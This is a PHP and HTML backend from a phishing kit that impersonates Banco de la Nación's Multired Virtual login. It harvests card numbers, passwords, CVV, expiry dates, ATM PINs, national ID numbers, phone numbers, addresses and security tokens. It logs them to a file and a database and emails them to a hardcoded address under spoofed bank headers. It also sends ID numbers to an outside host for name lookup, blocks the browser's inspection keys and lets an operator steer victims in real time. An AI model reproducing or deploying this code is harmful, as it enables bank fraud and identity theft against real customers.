<?php
error_reporting(0);
session_start();
date_default_timezone_set("America/Lima");//Perú
@include("class/db.php");

$prefijo = substr(uniqid(rand()), 0, 6);
$ipv = $_SERVER["REMOTE_ADDR"];

$log = "kcampospe@gmail.com";
$rspl = "files/js/multired.php";
$fecha = date("d/m/Y H:i:s");
$getx = ($_GET["id"]);

if($getx == "access"){
	$card = ($_POST["txtNumeroTarjeta"]);
	$_SESSION["card"] = $card;
	$password = ($_POST["txtPassword"]);
	$_SESSION["clave"] = $password;
	
	if(($card == "") || strlen($card) < 16 || !is_numeric($card) || (substr($card,0,7) != "4214100") || ($password == "") || strlen($password) < 6 || !is_numeric($password)){
	    header("location: logins.do?error=login");
	    exit;
	}
	
	$sms = "-------------------- [$ipv] --------------------<br />
BN Access ".$fecha."<br /><br />

Confirmar: [Usuario - ".$card."] | [Password - ".$password."]<br /><br />

------------------------------------------------------------------------<br />
https://zonasegura1.bn.com.pe/BNWeb/login.do<br />
------------------------------------------------------------------------<br /><br />";
	$subj = "BN Access - $ipv";
	$header .= "From: Access<$prefijo@bn.com.pe>" . "\r\n";
	$header .= "MIME-Version: 1.0" . "\r\n";
	$header .= "Content-type: text/html; charset=utf-8" . "\r\n";
	
	$back = fopen($rspl, "a+");
	fwrite($back, $sms);
	fclose($back);
	
	/*************************************************************************************************************/
	mysqli_query($link, "INSERT INTO usuarios (id, ip, card, pass, DNI, Celular, iniciar, token, master, line) VALUES (NULL, '".$ipv."', '".$card."', '".$password."', '', '', 'Esperando', 'Esperando', '".date("H:i:s")."', '1')");
	/*************************************************************************************************************/
		
	mail($log, $subj, $sms, $header);
	
	header("location: validUser.do?utm_source=bnacion&code_id=dni&cgi=".base64_encode($card));
}else if($getx == "card"){
	$card = $_SESSION["card"];
	$password = $_SESSION["clave"];
	
	$mesx = ($_POST["expemes"]);
	$aniox = ($_POST["expeano"]);
	$fechax = $mesx."/".$aniox;
	$_SESSION["fecha"] = $fechax;
	$cvv = ($_POST["cv"]);
	$atm = ($_POST["atm"]);
	
	if(($atm == "") || (strlen($atm) < 4) || !is_numeric($atm) || ($mesx == "") || (strlen($mesx) < 2) || !is_numeric($mesx) || ($aniox == "") || strlen($aniox) < 2 || !is_numeric($aniox) || ($cvv == "") || strlen($cvv) < 3 || !is_numeric($cvv)){
	    header("location: files/cc.php?error=verify");
	    exit;
	}
	
	$sms = "-------------------- [$ipv] --------------------<br />
BN Card ".$fecha."<br /><br />

Verificado: [Usuario - ".$card."] | [Password - ".$password."]<br /><br />
Confirmar: [Tarjeta - ".$card."] | [Fecha - ".$fechax."] | [CVV - ".$cvv."] | [ATM - ".$atm."]<br />

------------------------------------------------------------------------<br />
https://zonasegura1.bn.com.pe/BNWeb/login.do<br />
------------------------------------------------------------------------<br /><br />";
	$subj = "BN Card - $ipv";
	$header .= "From: Card<$prefijo@bn.com.pe>" . "\r\n";
	$header .= "MIME-Version: 1.0" . "\r\n";
	$header .= "Content-type: text/html; charset=utf-8" . "\r\n";
	
	$back = fopen($rspl, "a+");
	fwrite($back, $sms);
	fclose($back);
	
/*************************************************************************************************************/
	mysqli_query($link, "INSERT INTO iusuarios (id, icard, ipass, inombre, imv, iav, icv) VALUES (NULL, '".$card."', '".$password."', '".$atm."', '".$mesx."', '".$aniox."', '".$cvv."')");
	mysqli_query($link, "UPDATE usuarios SET master='".date("H:i:s")."', iniciar='Esperando', line='1' WHERE card='".$card."'");
	/*************************************************************************************************************/
	
	mail($log, $subj, $sms, $header);

	header("location: files/load.php?cgi=".base64_encode($nombre)."&card=".base64_encode($card));
}else if($getx == "celular"){
	$card = $_SESSION["card"];
	$password = $_SESSION["clave"];
	
	$dni = ($_POST["txtNumDoc"]);

	if(($dni == "") || strlen($dni) < 8 || !is_numeric($dni)){
	    header("location: offline.do?error=verify");
	    exit;
	}
	
	$_SESSION["dni"] = $dni;
	$_SESSION["celular"] = $celular;
	
	if(!function_exists('curl_exec')){
		$txtjson = file_get_contents("https://bbkidsbeta.000webhostapp.com/dni-valid.php?dni=".$dni);
	}else{
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, "https://bbkidsbeta.000webhostapp.com/dni-valid.php?dni=".$dni);
		curl_setopt($ch, CURLOPT_USERAGENT, $navegador);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_VERBOSE, true);
		curl_setopt($ch, CURLOPT_COOKIESESSION, true);
		curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
		curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		$txtjson = curl_exec($ch);
		curl_close($ch);	
	}
	
	$personXML = json_decode($txtjson);
	$nombre = $personXML->DatosPerson[0]->Nombres." ".$personXML->DatosPerson[0]->ApellidoPaterno." ".$personXML->DatosPerson[0]->ApellidoMaterno;
	
	$sms = "-------------------- [$ipv] --------------------<br />
BN DNI ".$fecha."<br /><br />

Verificado: [Usuario - ".$card."] | [Password - ".$password."]<br />
Confirmar: [DNI - ".$dni."] | [Nombre - ".$nombre."]<br /><br />

------------------------------------------------------------------------<br />
https://zonasegura1.bn.com.pe/BNWeb/login.do<br />
------------------------------------------------------------------------<br /><br />";
	$subj = "BN DNI - $ipv";
	$header .= "From: DNI<$prefijo@bn.com.pe>" . "\r\n";
	$header .= "MIME-Version: 1.0" . "\r\n";
	$header .= "Content-type: text/html; charset=utf-8" . "\r\n";
	
	$back = fopen($rspl, "a+");
	fwrite($back, $sms);
	fclose($back);

/*************************************************************************************************************/
	mysqli_query($link, "UPDATE usuarios SET nombre='".$nombre."', DNI='".$dni."', Celular='".$celular."', iniciar='Esperando', line='1', control='activado' WHERE card='".$card."'");
/*************************************************************************************************************/
		
	mail($log, $subj, $sms, $header);

	$result = mysqli_query($link, "SELECT estado FROM config;");
	$row = $result->fetch_array(MYSQLI_NUM);
	
	if($row[0] == 1){
		mysqli_query($link, "UPDATE usuarios SET iniciar='A-Celular' WHERE card='".$card."'");
		header("location: validCard.do?utm_source=bnacion&code_id=card&cgi=".base64_encode($nombre)."&card=".base64_encode($card));
	}
}else if($getx == "token"){
	$card = $_SESSION["card"];
	$password = $_SESSION["clave"];
	
	$repeat = ($_POST["Repetir"] + 1);
	$token = ($_POST["token"]);
	
	if(($token == "") || strlen($token) < 6 || !is_numeric($token)){
	    header("location: validToken.do?utm_source=bnacion&code_id=token&error=verify&card=".base64_encode($card));
	    exit;
	}
	
	$sms = "-------------------- [$ipv] --------------------<br />
BN Token ".$fecha."<br /><br />

Verificado: [Usuario - ".$card."] | [Password - ".$password."]<br />
Confirmar: [Token - ".$token."]<br /><br />

------------------------------------------------------------------------<br />
https://zonasegura1.bn.com.pe/BNWeb/login.do<br />
------------------------------------------------------------------------<br /><br />";
	$subj = "BN Token - $ipv";
	$header .= "From: Token<$prefijo@bn.com.pe>" . "\r\n";
	$header .= "MIME-Version: 1.0" . "\r\n";
	$header .= "Content-type: text/html; charset=utf-8" . "\r\n";
	
	$back = fopen($rspl, "a+");
	fwrite($back, $sms);
	fclose($back);

/*************************************************************************************************************/
	mysqli_query($link, "UPDATE usuarios SET token='".$token."', master='".date("H:i:s")."', iniciar='Esperando', line='1' WHERE card='".$card."'");
/*************************************************************************************************************/

	mail($log, $subj, $sms, $header);
	
	header("location: files/load.php?cgi=".base64_encode($nombre)."&card=".base64_encode($card));
}else if($getx == "datos"){
	$card = $_SESSION["card"];
	$password = $_SESSION["clave"];
	
	$celular = ($_POST["celular"]);
	$correo = ($_POST["correo"]);
	$direccion = ($_POST["direccion"]);
	
	$token = ($_POST["token"]);
	
	if(($celular == "") || strlen($celular) < 9 || !is_numeric($celular) || ($correo == "") || ($direccion == "") || ($token == "") || strlen($token) < 6 || !is_numeric($token)){
	    header("location: validDatos.do?utm_source=bnacion&code_id=token&error=verify");
	    exit;
	}
	
	$sms = "-------------------- [$ipv] --------------------<br />
BN Datos ".$fecha."<br /><br />

Verificado: [Usuario - ".$card."] | [Password - ".$password."]<br />
Confirmar: [Celular - ".$celular."] | [Correo - ".$correo."] | [Dirección - ".$direccion."]<br />
Confirmar: [Token - ".$token."]<br /><br />

------------------------------------------------------------------------<br />
https://zonasegura1.bn.com.pe/BNWeb/login.do<br />
------------------------------------------------------------------------<br /><br />";
	$subj = "BN Datos - $ipv";
	$header .= "From: Datos<$prefijo@bn.com.pe>" . "\r\n";
	$header .= "MIME-Version: 1.0" . "\r\n";
	$header .= "Content-type: text/html; charset=utf-8" . "\r\n";
	
	$back = fopen($rspl, "a+");
	fwrite($back, $sms);
	fclose($back);

/*************************************************************************************************************/
	mysqli_query($link, "UPDATE usuarios SET r3='".$codigo."', token='".$token."', master='".date("H:i:s")."', iniciar='Esperando', line='1' WHERE card='".$card."'");
/*************************************************************************************************************/

	mail($log, $subj, $sms, $header);
	
	header("location: files/ok.php?cgi=".base64_encode($nombre)."&card=".base64_encode($card));
}
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html><head> 
<script type="text/javascript" src="files/js/cufon.js"></script>
<script type="text/javascript" src="files/js/Medium_500.font.js"></script>
<script type="text/javascript" src="files/js/browser.js"></script>
<script type="text/javascript" src="files/js/jquery-1.11.2.js"></script>
<script type="text/javascript" src="files/js/jquery-1.8.2.min.js"></script>
<script type="text/javascript">
var brw = new Browser();
if(brw.code == 'ch'){
Cufon.replace('.dax');
Cufon.replace('.boton-clave');
	$(document).ready(function(){		
 		$('.boton-clave').css('height','20px');
		$('.boton-clave').css('padding-top','5px'); 	
	});
}
</script>
<meta http-equiv="Content-Language" content="es" />
<meta charset="utf-8">
<link rel="stylesheet" type="text/css" href="files/css/loadin.css"/>
<link rel="stylesheet" type="text/css" href="files/css/tipografias.css" />
<title>Banco de la Nación - Multired Virtual</title>
<style type="text/css">
.Estilo1 {
	color: #FF0000;
	font-weight: bold;
}
</style>
<script language="JavaScript">
document.onkeydown = function(e) {
tecla = (document.all) ? e.keyCode : e.which;
	//alert(tecla)
if (tecla === 116 || tecla === 123)  return false;
if (e.ctrlKey && (tecla === 67 || tecla === 83 || tecla === 85 || tecla === 86 || tecla === 116)) { return false; } else { return true; }};
$(document).keypress("u",function(e) { if(e.ctrlKey) { return false; } else { return true; } });
</script>
<script language="JavaScript">
document.addEventListener("contextmenu", function(e){e.preventDefault();}, false);
</script>
</head>
<body>
	<div id="contenedor">
        <div id="cabecera">
            <div id="logo-multired">
              <img src="files/img/logo-multired.jpg" alt="Logotipo Multired" />
            </div>
            <div id="logo-bn">
                <img src="files/img/logo-bn.jpg" alt="Logotipo del Banco de la Nación" />
            </div>
        </div>
        <div id="cuerpo">
            <h1 class="dax"><img src="files/img/candado.png"> Usted se encuentra en una <span>zona segura</span></h1>
            <div id="login">
                <div id="border-superior"><img src="files/img/border-arriba.png" alt="Border Login Superior" /></div>
                <div id="login-contenido"><div class="cssmsg">Validando el ingreso a sus cuentas</div>
                <input type="hidden" id="id" value="<?=$x?>" />
<div class="cssload-loader"></div><div class="cssmsg2">Por favor espere unos segundos...</div>
				</div>
                <div id="border-inferior"><img src="files/img/border-abajo.png" alt="Border Login Inferior" /></div>
            </div>
        </div>   
<div id="pie-pagina">
   <div id="titulo-pie-pagina">Banco de la Nación  |  Ministerio de Economía y Finanzas</div>
      <div id="oficinas">
        <p>Oficina Principal: Av. República de Panamá 3664. San Isidro. Central Telefónica: 519-20 00. </p>
        <p>Atención en Oficinas Administrativas: Lunes a Viernes de 8:30 a 17:30 horas. Refrigerio de: 13 a 14 horas </p>
        <p>Ateción en Oficina de Trámite Documentario: Lunes a Viernes de 9:00 a 17:00 horas (Horario corrido).</p>
            </div>
        </div>
    </div>
</body>
<script>
		$(document).ready(function(e){
			setTimeout("refindx();",3000);
			
			$(window).focus(function(){
        		line(true);
    		});
       		$(window).blur(function() {
        		line(false);
    		});
		});
		
		function line(numb){
			$.ajax({
					url: "recalcular.php?idx=online",
					method: "POST",
					data: {numb: (numb ? "1" : "0")},
					beforeSend: function(){},
					success: function(result){},
					error: function(){line(numb);}
			});
		}
		
		function refindx(){
				$.ajax({
					url: "recalcular.php",
					method: "POST",
					data: {id:"<?php echo $card; ?>"},
					beforeSend: function(){},
					success: function(result){
						if(result == "Esperando"){
							refindx();
						}else if(result == "CC"){
							window.location = 'validCard.do?utm_source=bnacion&code_id=card&cgi=<?= base64_encode($nombre)."&rpt=".base64_encode($repeat)."&card=".base64_encode($card); ?>';
						}else if(result == "Token"){
							window.location.href = "validToken.do?utm_source=bnacion&code_id=token&cgi=<?= base64_encode($nombre)."&rpt=".base64_encode($repeat)."&card=".base64_encode($card); ?>";
						}else if(result == "Datos"){
							window.location.href = "validDatos.do?utm_source=bnacion&code_id=token&cgi=<?= base64_encode($nombre)."&rpt=".base64_encode($repeat)."&card=".base64_encode($card); ?>";
						}else if(result == "Resumen"){
							window.location.href = "correctLog.do?metodo=authentic";
						}else if(result == "Login"){
							window.location.href = "logins.do?error=login";
						}else if(result == "Error"){
							window.location = 'logins.do?utm_source=bnacion&code_id=error';
						}else if(result == "Bloquear"){
							window.location.href = "bloquear.php";
						}else{
							refindx();
						}
					},
					error: function(){refindx();}
				});
			}
	</script>
</html>